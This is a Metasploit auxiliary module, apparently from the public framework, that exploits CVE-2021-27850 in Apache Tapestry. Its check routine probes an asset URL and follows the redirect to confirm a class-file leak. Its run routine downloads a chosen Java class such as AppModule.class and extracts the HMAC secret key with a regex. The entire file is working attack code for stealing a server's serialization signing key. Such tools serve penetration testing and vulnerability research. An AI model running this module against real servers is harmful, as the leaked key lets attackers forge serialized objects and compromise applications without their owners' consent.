##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

    include Exploit::Remote::HttpClient

    def initialize(info = {})
      super(
        update_info(
          info,
          'Name'           => 'Apache Tapestry HMAC secret key leak',
          'Description'    => %q(
              Find the HMAC secret key used in Java serizalization
          ),
          'License'        => MSF_LICENSE,
          'Author'         => ['Johannes Moritz',                       #CVE
                               'Yann Castel (yann.castel@orange.com)'], #Metasploit module
          'References'     =>
            [
              [ 'CVE', '2021-27850']
            ],
          'DisclosureDate' => '2021-04-15'
        )
      )

      register_options([
        Opt::RPORT(8080),
        Opt::RHOST("localhost"),
        OptString.new('TARGETED_CLASS', [false, 'Name of the targeted java class','AppModule.class'])
      ])
    end

    def check

      res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => '/assets/app/something/services/AppModule.class/'
      })

      if res == nil
        Exploit::CheckCode::Unknown
      elsif res.code == 302

        id_url = res.redirection.to_s[/assets\/app\/(\w+)\/services\/AppModule.class/, 1]
        res = send_request_cgi({
          'method'   => 'GET',
          'uri'      => '/assets/app/'+id_url+'/services/AppModule.class/'
        })

        if res.code == 200 && res.headers['Content-Type'] == 'application/java'
          print_good("Java file leak at "+rhost+":"+rport.to_s+"/assets/app/"+id_url+"/services/AppModule.class/")
          Exploit::CheckCode::Vulnerable
        else
          Exploit::CheckCode::Safe
        end
      else
        Exploit::CheckCode::Safe
      end
    end

    def run

      res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => '/assets/app/something/services/AppModule.class/'
      })

      id_url = res.redirection.to_s[/assets\/app\/(\w+)\/services\/AppModule.class/, 1]
      res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => '/assets/app/'+id_url+'/services/'+datastore['TARGETED_CLASS']+'/'
      })

      raw_class_file = res.body.to_s
      secret_key = raw_class_file[/\w{8}\-\w{4}\-\w{4}\-\w{4}\-\w{12}/, 0]

      if secret_key == nil
        print_fail("No secret key found")
      else
        print_good("Secret key found : "+secret_key)
      end
    end
end
